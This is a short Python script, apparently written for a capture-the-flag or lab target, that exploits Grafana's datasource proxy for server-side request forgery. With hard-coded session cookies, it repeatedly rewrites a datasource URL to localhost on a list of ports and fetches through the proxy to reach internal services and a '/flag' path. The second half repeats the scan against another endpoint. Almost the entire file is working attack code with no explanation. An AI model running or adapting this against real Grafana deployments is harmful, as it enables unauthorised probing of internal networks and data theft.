import requests
session = requests.Session()
session.headers.update({
    'Cookie': 'grafana_session=49fac5287d4d2d5a19013ce9cafcfe81',
    'Content-Type': 'application/json'
})
config_url = 'http://192.168.5.5:3000/api/datasources/1'
proxy_root = 'http://192.168.5.5:3000/api/datasources/uid/7VjMqXZDk/proxy/flag'
config = {
    'name': 'local-flag',
    'type': 'prometheus',
    'access': 'proxy'
}
ports = [3000, 80, 8080, 8081, 9090, 9091, 5000, 5001, 8000, 8888, 9000, 9100, 10000]
for port in ports:
    config['url'] = f'http://127.0.0.1:{port}'
    resp = session.put(config_url, json=config)
    if resp.status_code != 200:
        print(port, 'update failed', resp.status_code)
        continue
    resp2 = session.get(proxy_root)
    print(port, resp2.status_code, len(resp2.text))
    if resp2.status_code == 200:
        print(resp2.text)
        break

ports = [80, 443, 8080, 8000, 5000, 5001, 7000, 7001, 9000, 9001, 9090, 9091, 10000]
cookie = {'grafana_session': '1c6808826cb96e17d324ffef38dc1179'}
config_url = 'http://192.168.5.5:3000/api/datasources/1'
proxy_root = 'http://192.168.5.5:3000/api/datasources/proxy/1/'
config = {'name':'local-flag','type':'prometheus','access':'proxy'}
for port in ports:
    config['url'] = f'http://127.0.0.1:{port}'
    resp = requests.put(config_url, json=config, cookies=cookie)
    if resp.status_code != 200:
        print(port, 'update failed', resp.status_code)
        continue
    resp2 = requests.get(proxy_root, cookies=cookie)
    print(port, resp2.status_code, len(resp2.text))
